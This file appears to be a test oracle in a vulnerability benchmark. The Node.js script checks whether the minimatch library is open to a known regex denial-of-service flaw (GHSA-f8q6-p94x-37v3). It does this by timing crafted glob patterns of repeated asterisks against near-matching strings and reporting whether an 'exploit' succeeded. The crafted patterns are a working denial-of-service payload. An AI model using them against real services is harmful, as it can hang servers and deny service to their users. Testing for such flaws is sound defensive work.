'use strict';
const minimatch = require('minimatch');

function main() {
  try {
    // --- Benign operation first: prove basic matching works ---
    const benignPositive = minimatch('index.js', '*.js');
    const benignNegative = minimatch('index.txt', '*.js');

    if (benignPositive !== true || benignNegative !== false) {
      console.log('ORACLE_RESULT ' + JSON.stringify({
        operation_completed: false,
        exploit_succeeded: false,
        evidence: 'Benign minimatch operation did not return expected result.'
      }));
      return;
    }

    const operation_completed = true;

    // --- Malicious input: known minimatch <=3.0.4 ReDoS trigger ---
    // GHSA-f8q6-p94x-37v3: the pattern-to-regex conversion for groups of
    // repeated '*' separated by '!' inside a bracket-like construct can
    // create a regex with nested quantifiers that exhibits catastrophic
    // backtracking when matched against a crafted subject string that
    // almost (but not quite) matches. We scale 'n' (the repeat count)
    // across a short list of increasing sizes and measure how fast the
    // elapsed time grows: on the vulnerable version this grows
    // exponentially and blows past our bounded time budget, while the
    // patched version stays fast for all tested sizes.
    function buildPattern(n) {
      return '[!' + '*'.repeat(n) + ']' + '*'.repeat(n);
    }
    function buildSubject(n) {
      // Length scales with n so the backtracking work scales too, but
      // stays small enough that even the vulnerable call finishes within
      // a few seconds for the sizes we use.
      return 'a'.repeat(10 + n) + '!';
    }

    const sizes = [10, 20, 28];
    const THRESHOLD_MS = 1500;
    let exploit_succeeded = false;
    let lastElapsed = 0;
    let lastN = 0;
    let lastSubjectLen = 0;
    let lastMatched;
    let threw = false;
    let thrownMessage = '';

    for (const n of sizes) {
      const pattern = buildPattern(n);
      const subject = buildSubject(n);
      const start = Date.now();
      let matched;
      try {
        matched = minimatch(subject, pattern);
      } catch (innerErr) {
        threw = true;
        thrownMessage = String(innerErr && innerErr.message);
        lastElapsed = Date.now() - start;
        lastN = n;
        lastSubjectLen = subject.length;
        break;
      }
      const elapsed = Date.now() - start;
      lastElapsed = elapsed;
      lastN = n;
      lastSubjectLen = subject.length;
      lastMatched = matched;

      if (elapsed >= THRESHOLD_MS) {
        exploit_succeeded = true;
        break;
      }
    }

    if (threw) {
      console.log('ORACLE_RESULT ' + JSON.stringify({
        operation_completed: true,
        exploit_succeeded: false,
        evidence: 'Malicious pattern raised an exception at n=' + lastN + ' after ' + lastElapsed + 'ms: ' + thrownMessage
      }));
      return;
    }

    const evidence = 'Malicious minimatch call (last tested n=' + lastN + ', subjectLen=' + lastSubjectLen +
      ') completed in ' + lastElapsed + 'ms (threshold ' + THRESHOLD_MS + 'ms). Result=' + lastMatched +
      '. exploit_succeeded=' + exploit_succeeded;

    console.log('ORACLE_RESULT ' + JSON.stringify({
      operation_completed: operation_completed,
      exploit_succeeded: exploit_succeeded,
      evidence: evidence
    }));
  } catch (err) {
    console.log('ORACLE_RESULT ' + JSON.stringify({
      operation_completed: false,
      exploit_succeeded: false,
      evidence: 'Unexpected exception: ' + String(err && err.message)
    }));
  }
}

main();
